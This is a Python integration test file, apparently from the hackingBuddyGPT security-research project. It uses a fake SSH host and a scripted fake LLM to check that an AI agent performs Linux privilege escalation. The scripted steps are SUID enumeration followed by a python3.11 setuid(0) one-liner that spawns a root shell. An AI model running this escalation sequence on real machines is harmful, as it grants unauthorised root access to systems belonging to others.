from typing import Tuple

from hackingBuddyGPT.utils.logging import LocalLogger
from hackingBuddyGPT.usecases.examples.agent import (
    ExPrivEscLinux,
    ExPrivEscLinuxUseCase,
)
from hackingBuddyGPT.usecases.examples.agent_with_state import (
    ExPrivEscLinuxTemplated,
    ExPrivEscLinuxTemplatedUseCase,
)
from hackingBuddyGPT.usecases.privesc.linux import LinuxPrivesc, LinuxPrivescUseCase
from hackingBuddyGPT.utils.console.console import Console
from hackingBuddyGPT.utils.db_storage.db_storage import DbStorage
from hackingBuddyGPT.utils.llm_util import LLM, LLMResult


class FakeSSHConnection:
    username: str = "lowpriv"
    password: str = "toomanysecrets"
    hostname: str = "theoneandonly"

    results = {
        "id": "uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)",
        "sudo -l": "Sorry, user lowpriv may not run sudo on test-1.",
        "find / -perm -4000 2>/dev/null": """
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
│ /usr/bin/find
│ /usr/bin/chfn
│ /usr/bin/passwd
│ /usr/bin/python3.11
│ /usr/bin/chsh
│ /usr/bin/umount
│ /usr/bin/sudo
│ /usr/bin/mount
│ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
│ /usr/lib/openssh/ssh-keysign
""",
        "/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'": "# ",
    }

    def run(self, cmd, *args, **kwargs) -> Tuple[str, str, int]:
        out_stream = kwargs.get("out_stream", None)

        if cmd in self.results:
            out_stream.write(self.results[cmd])
            return self.results[cmd], "", 0
        else:
            return "", "Command not found", 1


class FakeLLM(LLM):
    model: str = "fake_model"
    context_size: int = 4096

    counter: int = 0
    responses = [
        "id",
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "/usr/bin/python3.11 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    ]

    def get_response(self, prompt, *, capabilities=None, **kwargs) -> LLMResult:
        response = self.responses[self.counter]
        self.counter += 1

        return LLMResult(result=response, prompt="this would be the prompt", answer=response)

    def encode(self, query) -> list[int]:
        return [0]


def test_linuxprivesc():
    conn = FakeSSHConnection()
    llm = FakeLLM()
    log_db = DbStorage(":memory:")
    console = Console()

    log_db.init()

    log = LocalLogger(
        log_db=log_db,
        console=console,
        tag="integration_test_linuxprivesc",
    )
    priv_esc = LinuxPrivescUseCase(
        agent=LinuxPrivesc(
            conn=conn,
            enable_explanation=False,
            disable_history=False,
            hint="",
            llm=llm,
            log=log,
        ),
        log=log,
        max_turns=len(llm.responses),
    )

    priv_esc.init()
    result = priv_esc.run({})
    assert result is True


def test_minimal_agent():
    conn = FakeSSHConnection()
    llm = FakeLLM()
    log_db = DbStorage(":memory:")
    console = Console()

    log_db.init()

    log = LocalLogger(
        log_db=log_db,
        console=console,
        tag="integration_test_minimallinuxprivesc",
    )
    priv_esc = ExPrivEscLinuxUseCase(
        agent=ExPrivEscLinux(conn=conn, llm=llm, log=log),
        log=log,
        max_turns=len(llm.responses)
    )

    priv_esc.init()
    result = priv_esc.run({})
    assert result is True


def test_minimal_agent_state():
    conn = FakeSSHConnection()
    llm = FakeLLM()
    log_db = DbStorage(":memory:")
    console = Console()

    log_db.init()

    log = LocalLogger(
        log_db=log_db,
        console=console,
        tag="integration_test_linuxprivesc",
    )
    priv_esc = ExPrivEscLinuxTemplatedUseCase(
        agent=ExPrivEscLinuxTemplated(conn=conn, llm=llm, log=log),
        log=log,
        max_turns=len(llm.responses)
    )

    priv_esc.init()
    result = priv_esc.run({})
    assert result is True
